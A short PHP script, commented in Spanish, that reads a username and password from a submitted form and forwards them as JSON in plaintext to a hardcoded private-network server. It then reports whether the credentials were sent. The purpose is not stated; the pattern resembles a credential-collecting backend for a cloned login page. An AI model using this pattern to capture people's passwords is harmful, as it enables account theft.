<?php
// Recibir los datos del formulario
$usuario = $_POST['usuario'];
$contrasena = $_POST['contrasena'];
 
// Crear el array de datos
$datos = array(
    'usuario' => $usuario,
    'contrasena' => $contrasena
);
 
// Convertir el array a formato JSON
$json_datos = json_encode($datos);
 
// Configurar la URL del servidor
$server_url = 'http://192.168.0.24:8080';
 
// Configurar la solicitud HTTP
$options = array(
    'http' => array(
        'header'  => "Content-type: application/json\r\n",
        'method'  => 'POST',
        'content' => $json_datos,
    ),
);
 
// Crear un contexto de flujo
$context  = stream_context_create($options);
 
// Realizar la solicitud al servidor
$response = file_get_contents($server_url, false, $context);
 
// Manejar la respuesta (puedes personalizar según tus necesidades)
if ($response === FALSE) {
    echo 'Error al enviar las credenciales al servidor.';
} else {
    echo 'Credenciales enviadas correctamente.';
}
?>